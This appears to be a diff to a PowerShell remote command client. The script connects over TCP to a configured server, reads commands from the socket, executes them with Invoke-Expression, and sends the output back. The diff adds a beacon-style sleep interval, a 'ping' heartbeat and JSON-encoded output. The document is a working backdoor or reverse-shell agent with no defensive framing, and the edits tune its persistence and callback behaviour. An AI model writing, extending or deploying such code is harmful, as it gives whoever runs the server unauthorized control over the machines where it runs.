@@ -2,6 +2,9 @@
 $serverIP = "127.0.0.1"
 $serverPort = 8080
 
+# Config
+$sleeptime = 60
+
 function Connect-ToServer {
     while ($true) {
         try {
@@ -13,25 +16,35 @@ function Connect-ToServer {
             Write-Host "Connected to server!"
             return
         } catch {
-            Write-Host "Failed to connect. Retrying in 10 seconds..."
-            Start-Sleep -Seconds 10
+            Write-Host "Failed to connect to server. Retrying in $sleeptime seconds..."
+            Start-Sleep -Seconds $sleeptime
         }
+    }
+}
+
+# Function to test connection to server
+function Test-Connection {
+    try {
+        $writer.WriteLine("ping")
+        $writer.Flush()
+    } catch {
+        
     }
 }
 
 # Function to handle incoming commands
 function Handle-Commands {
     while ($true) {
+        Test-Connection
         if ($client.Connected) {
             if ($networkStream.DataAvailable) {
                 $command = $reader.ReadLine()
-                #execute command in shell and send output back to server
-                $output = Invoke-Expression $command
+                $output = Invoke-Expression $command | ConvertTo-Json
                 $writer.WriteLine($output)
                 $writer.Flush()
                 $client.Close()
             }
-            Start-Sleep -Milliseconds 100
+            Start-Sleep -Seconds $sleeptime
         } else {
             Write-Host "Disconnected from server. Attempting to reconnect..."
             Connect-ToServer
